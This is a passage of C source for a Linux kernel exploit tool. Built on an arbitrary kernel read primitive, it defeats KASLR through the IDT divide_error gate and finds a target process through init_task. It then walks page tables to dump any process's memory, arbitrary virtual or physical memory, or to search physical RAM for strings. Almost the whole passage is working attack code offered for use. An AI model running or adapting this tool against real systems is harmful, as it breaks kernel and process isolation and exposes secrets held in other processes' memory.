		if (vm_start >= TASK_SIZE || vm_end >= TASK_SIZE) {
			info("[-] bad mmap (did the task die?)\n");
			exit(EXIT_FAILURE);
		}
		unsigned vm_flags =
			read_field_4(mmap, O_VM_AREA_STRUCT_VM_FLAGS);
		entries[count].start = vm_start;
		entries[count].end = vm_end;
		entries[count].flags = vm_flags;
		count++;
		mmap = read_field_8(mmap, O_VM_AREA_STRUCT_VM_NEXT);
	}

	for (i = 0; i < count; i++)
		callback(&entries[i], private);
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static unsigned long g_kernel_text = 0;
static unsigned long g_physmap = 0;

static struct ptsc g_ptsc;

static void physmap_init() {
	unsigned long divide_error = read_idt_gate(0);
	info("[.] divide_error:     %016lx\n", divide_error);

	g_kernel_text = divide_error - O_DIVIDE_ERROR;
	info("[.] kernel text:      %016lx\n", g_kernel_text);

	if (O_PAGE_OFFSET_BASE) {
		unsigned long page_offset_base =
			g_kernel_text + O_PAGE_OFFSET_BASE;
		info("[.] page_offset_base: %016lx\n", page_offset_base);

		g_physmap = read_8(page_offset_base);
		info("[.] physmap:          %016lx\n", g_physmap);
		if (g_physmap < PAGE_OFFSET_BASE) {
			info("[-] physmap sanity check failed "
					"(wrong offset?)\n");
			exit(EXIT_FAILURE);
		}
	} else {
		g_physmap = PAGE_OFFSET_BASE;
		info("[.] physmap:          %016lx\n", g_physmap);
	}
}

static unsigned long g_mmap = 0;

static void pts_init(int pid) {
	unsigned long mm;

	if (pid != 0) {
		unsigned long init_task = g_kernel_text + O_INIT_TASK;
		info("[.] init_task:        %016lx\n", init_task);

		unsigned long task = find_task_by_pid(init_task, pid);
		info("[.] task:             %016lx\n", task);
		if (task == 0) {
			info("[-] task %d not found\n", pid);
			exit(EXIT_FAILURE);
		} else if (task < PAGE_OFFSET_BASE) {
			info("[-] task sanity check failed (wrong offset?)\n");
			exit(EXIT_FAILURE);
		}

		mm = read_field_8(task, O_TASK_STRUCT_MM);
		info("[.] task->mm:         %016lx\n", mm);
		if (mm == 0) {
			info("[-] mm not found (kernel task?)\n");
			exit(EXIT_FAILURE);
		} else if (mm < PAGE_OFFSET_BASE) {
			info("[-] mm sanity check failed (wrong offset?)\n");
			exit(EXIT_FAILURE);
		}

		g_mmap = read_field_8(mm, O_MM_STRUCT_MMAP);
		info("[.] task->mm->mmap:   %016lx\n", g_mmap);
		if (g_mmap < PAGE_OFFSET_BASE) {
			info("[-] mmap sanity check failed (wrong offset?)\n");
			exit(EXIT_FAILURE);
		}
	} else {
		mm = g_kernel_text + O_INIT_MM;
	}

	unsigned long pgd = read_field_8(mm, O_MM_STRUCT_PGD);
	info("[.] task->mm->pgd:    %016lx\n", pgd);
	if (pgd < PAGE_OFFSET_BASE) {
		info("[-] pgd sanity check failed (wrong offset?)\n");
		exit(EXIT_FAILURE);
	}

	ptsc_init(&g_ptsc, g_physmap, pgd);
}

static unsigned long page_virt_to_phys(unsigned long addr) {
	unsigned long paddr = ptsc_page_virt_to_phys(&g_ptsc, addr);
	assert(paddr != 0);
	return paddr - g_physmap;
}

static bool page_check_virt(unsigned long addr) {
	unsigned long paddr = ptsc_page_virt_to_phys(&g_ptsc, addr);
	return paddr != 0;
}

static bool page_check_phys(unsigned long offset) {
	return page_check_virt(g_physmap + offset);
}

static void phys_read_range(unsigned long offset, size_t length, char *buffer) {
	read_range(g_physmap + offset, length, buffer);
}

static void for_each_mmap(mmap_callback callback, void *private) {
	for_each_mmap_from(g_mmap, callback, private);
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static int create_file(const char *path) {
	int fd = open(path, O_RDWR | O_CREAT, 0644);
	if (fd < 0) {
		perror("[-] open()");
		exit(EXIT_FAILURE);
	}
	return fd;
}

static int open_dir(const char *path) {
	int fd = open(path, O_DIRECTORY | O_PATH);
	if (fd < 0) {
		perror("[-] open()");
		exit(EXIT_FAILURE);
	}
	return fd;
}

static int create_file_in_dir(int dirfd, const char *name) {
	int fd = openat(dirfd, name, O_RDWR | O_CREAT, 0644);
	if (fd < 0) {
		perror("[-] openat()");
		exit(EXIT_FAILURE);
	}
	return fd;
}

static void write_file(int fd, char *buffer, size_t length) {
	int rv = write(fd, buffer, length);
	if (rv != length) {
		perror("[-] write()");
		exit(EXIT_FAILURE);
	}
}

static void write_bytes(int fd, unsigned long src_addr,
			char *buffer, size_t length) {
	if (fd < 0)
		print_bytes(LOG_INFO, src_addr, buffer, length);
	else
		write_file(fd, buffer, length);
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

void read_virt_memory(unsigned long addr, size_t length, int fd) {
	char buffer[PAGE_SIZE];
	char empty[PAGE_SIZE];

	debug1("read_virt_memory: addr = %016lx, length = %016lx\n",
			addr, length);

	memset(&empty[0], 0, sizeof(empty));

	size_t total_read = 0;
	while (total_read < length) {
		unsigned long current = addr + total_read;
		size_t to_read = PAGE_SIZE;
		if (current % PAGE_SIZE != 0)
			to_read = PAGE_SIZE - current % PAGE_SIZE;
		to_read = min(to_read, length - total_read);
		if (page_check_virt(addr + total_read)) {
			read_range(addr + total_read, to_read, &buffer[0]);
			write_bytes(fd, addr + total_read, &buffer[0], to_read);
		} else {
			write_bytes(fd, addr + total_read, &empty[0], to_read);
		}
		total_read += to_read;
	}
}

void read_phys_memory(unsigned long src_addr, unsigned long offset,
			size_t length, int fd) {
	char buffer[PAGE_SIZE];
	char empty[PAGE_SIZE];

	debug1("read_phys_memory: offset = %016lx, length = %016lx\n",
			offset, length);

	memset(&empty[0], 0, sizeof(empty));

	size_t total_read = 0;
	while (total_read < length) {
		unsigned long current = offset + total_read;
		size_t to_read = PAGE_SIZE;
		if (current % PAGE_SIZE != 0)
			to_read = PAGE_SIZE - current % PAGE_SIZE;
		to_read = min(to_read, length - total_read);
		if (page_check_phys(offset + total_read)) {
			phys_read_range(offset + total_read, to_read,
						&buffer[0]);
			write_bytes(fd, src_addr + offset + total_read,
					&buffer[0], to_read);
		} else {
			write_bytes(fd, src_addr + offset + total_read,
					&empty[0], to_read);
		}
		total_read += to_read;
	}
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define VM_READ		0x00000001
#define VM_WRITE	0x00000002
#define VM_EXEC		0x00000004

static void print_mmap(unsigned long start, unsigned long end, unsigned flags) {
	info("[%016lx, %016lx)  %s%s%s\n",
		start, end,
		(flags & VM_READ)  ? "r" : "-",
		(flags & VM_WRITE) ? "w" : "-",
		(flags & VM_EXEC)  ? "x" : "-");
}

static void name_mmap(unsigned long start, unsigned long end, unsigned flags,
			char *buffer, size_t length) {
	snprintf(buffer, length, "%016lx_%016lx_%s%s%s",
		start, end,
		(flags & VM_READ)  ? "r" : "-",
		(flags & VM_WRITE) ? "w" : "-",
		(flags & VM_EXEC)  ? "x" : "-");
}

static void save_mmap(struct mmap_entry *entry, void *private) {
	int dirfd = (int)(unsigned long)private;
	unsigned long length;
	char name[128];
	char empty[PAGE_SIZE];

	assert(entry->start % PAGE_SIZE == 0);
	assert(entry->end % PAGE_SIZE == 0);

	memset(&empty, 0, sizeof(empty));
	length = entry->end - entry->start;

	print_mmap(entry->start, entry->end, entry->flags);
	name_mmap(entry->start, entry->end, entry->flags,
			&name[0], sizeof(name));
	int fd = create_file_in_dir(dirfd, &name[0]);

	size_t total_read = 0;
	while (total_read < length) {
		if (page_check_virt(entry->start + total_read)) {
			unsigned long offset = page_virt_to_phys(
				entry->start + total_read);
			read_phys_memory(entry->start + total_read, offset,
						PAGE_SIZE, fd);
		} else {
			write_bytes(fd, entry->start + total_read,
					&empty[0], PAGE_SIZE);
		}
		total_read += PAGE_SIZE;
	}

	close(fd);
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

unsigned long get_phys_size() {
	struct sysinfo info;
	int rv = sysinfo(&info);
	if (rv != 0) {
		perror("sysinfo()");
		return EXIT_FAILURE;
	}
	debug1("phys size: %016lx\n", info.totalram);
	return info.totalram;
}

void phys_search(unsigned long start, unsigned long end, char *needle) {
	char buffer[PAGE_SIZE];
	int length = strlen(needle);

	assert(length <= PAGE_SIZE);

	unsigned long offset;
	for (offset = start; offset < end; offset += PAGE_SIZE) {
		if (offset % (32ul << 20) == 0)
			info("[.] now at %016lx\n", offset);
		if (!page_check_phys(offset))
			continue;
		phys_read_range(offset, length,	&buffer[0]);
		if (memcmp(&buffer[0], needle, length) != 0)
			continue;
		info("[+] found at %016lx\n", offset);
		return;
	}
	info("[-] not found\n");
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define CMD_IDT		1
#define CMD_PID		2
#define CMD_VIRT	3
#define CMD_PHYS	4
#define CMD_SEARCH	5

int g_cmd = 0;

static unsigned g_num = 1;
static unsigned g_pid = 0;
static unsigned long g_addr = 0;
static unsigned long g_length = 0;
static unsigned long g_offset = 0;
static const char *g_dir = NULL;
static const char *g_file = NULL;
static char *g_string = NULL;

static void print_usage(const char* name) {
	info("Usage: \n");
	info(" %s idt [NUM]                       "
			"dump IDT entries\n", name);
	info(" %s pid PID DIR                     "
			"dump process memory\n", name);
	info(" %s virt ADDR LENGTH [FILE]         "
			"dump virtual memory\n", name);
	info(" %s phys OFFSET LENGTH [FILE]       "
			"dump physical memory\n", name);
	info(" %s search STRING [OFFSET [LENGTH]] "
			"search start of each physical page\n", name);
	info("\n");
	info(" NUM, PID - decimals\n");
	info(" ADDR, LENGTH, OFFSET - hex\n");
	info(" DIR, FILE, STRING - strings\n");
}

static bool parse_u(char *s, int base, unsigned *out) {
	int length = strlen(s);
	char *endptr = NULL;
	unsigned long result = strtoul(s, &endptr, base);
	if (endptr != s + length)
		return false;
	*out = result;
	return true;
}

static bool parse_ul(char *s, int base, unsigned long *out) {
	int length = strlen(s);
	char *endptr = NULL;
	unsigned long result = strtoul(s, &endptr, base);
	if (endptr != s + length)
		return false;
	*out = result;
	return true;
}

static int parse_cmd(const char *cmd) {
	if (strcmp(cmd, "idt") == 0)
		return CMD_IDT;
	if (strcmp(cmd, "pid") == 0)
		return CMD_PID;
	if (strcmp(cmd, "virt") == 0)
		return CMD_VIRT;
	if (strcmp(cmd, "phys") == 0)
		return CMD_PHYS;
	if (strcmp(cmd, "search") == 0)
		return CMD_SEARCH;
	return 0;
}

static bool parse_args(int argc, char **argv) {
	if (argc < 2)
		return false;

	g_cmd = parse_cmd(argv[1]);

	switch (g_cmd) {
	case CMD_IDT:
		if (argc > 3)
			return false;
		if (argc >= 3 && !parse_u(argv[2], 10, &g_num))
			return false;
		return true;
	case CMD_PID:
		if (argc != 4)
			return false;
		if (!parse_u(argv[2], 10, &g_pid))
			return false;
		if (g_pid <= 0)
			return false;
		g_dir = argv[3];
		debug1("CMD_PID %u %s\n", g_pid, g_dir);
		return true;
	case CMD_VIRT:
		if (argc < 4 || argc > 5)
			return false;
		if (!parse_ul(argv[2], 16, &g_addr))
			return false;
		if (!parse_ul(argv[3], 16, &g_length))
			return false;
		if (argc == 5)
			g_file = argv[4];
		debug1("CMD_VIRT %016lx %016lx %s\n", g_addr,
				g_length, g_file ? g_file : "NULL");
		return true;
	case CMD_PHYS:
		if (argc < 4 || argc > 5)
			return false;
		if (!parse_ul(argv[2], 16, &g_offset))
			return false;
		if (!parse_ul(argv[3], 16, &g_length))
			return false;
		if (argc == 5)
			g_file = argv[4];
		debug1("CMD_PHYS %016lx %016lx %s\n", g_offset,
				g_length, g_file ? g_file : "NULL");
		return true;
	case CMD_SEARCH:
		if (argc < 3 || argc > 5)
			return false;
		g_string = argv[2];
		if (argc >= 4 && !parse_ul(argv[3], 16, &g_offset))
			return false;
		if (argc >= 5 && !parse_ul(argv[4], 16, &g_length))
			return false;
		debug1("CMD_SEARCH <%s> %016lx %016lx\n",
				g_string, g_offset, g_length);
		return true;
	default:
		return false;
	}

	return true;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

void handle_cmd_idt() {
	info("[.] dumping IDT\n");
	print_idt(g_num);
	info("[+] done\n");
}

void handle_cmd_virt() {
	int fd = -1;
	info("[.] dumping virtual memory [%016lx, %016lx):\n",
		g_addr, g_addr + g_length);
	if (g_file != NULL)
		fd = create_file(g_file);
	read_virt_memory(g_addr, g_length, fd);
	if (fd != -1)
		close(fd);
	info("[+] done\n");
}

void handle_cmd_phys() {
	int fd = -1;
	info("[.] dumping physical memory [%016lx, %016lx):\n",
		g_offset, g_offset + g_length);
	if (g_file != NULL)
		fd = create_file(g_file);
	read_phys_memory(0, g_offset, g_length, fd);
	if (fd != -1)
		close(fd);
	info("[+] done\n");
}

void handle_cmd_pid() {
	info("[.] dumping mmaps for %u:\n", g_pid);
	int dirfd = open_dir(g_dir);
	for_each_mmap(save_mmap, (void *)(unsigned long)dirfd);
	close(dirfd);
	info("[+] done\n");
}

void handle_cmd_search() {
	unsigned long start = g_offset ? g_offset : 0;
	unsigned long end = g_length ? (start + g_length) : get_phys_size();
	info("[.] searching [%016lx, %016lx) for '%s':\n",
			start, end, g_string);
	phys_search(start, end, g_string);
	info("[+] done\n");
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

int main(int argc, char **argv) {
	assert(getpagesize() == PAGE_SIZE);

	if (!parse_args(argc, argv)) {
		print_usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	arbitrary_read_init();

	if (g_cmd == CMD_IDT) {
		handle_cmd_idt();
		return EXIT_SUCCESS;
	}

	physmap_init();

	switch (g_cmd) {
	case CMD_VIRT:
		pts_init(getpid());
		handle_cmd_virt();
		break;
	case CMD_PHYS:
		pts_init(0);
		handle_cmd_phys();
		break;
	case CMD_SEARCH:
		pts_init(0);
		handle_cmd_search();
		break;
	case CMD_PID:
		pts_init(g_pid);
		handle_cmd_pid();
		break;
	}

	return EXIT_SUCCESS;
}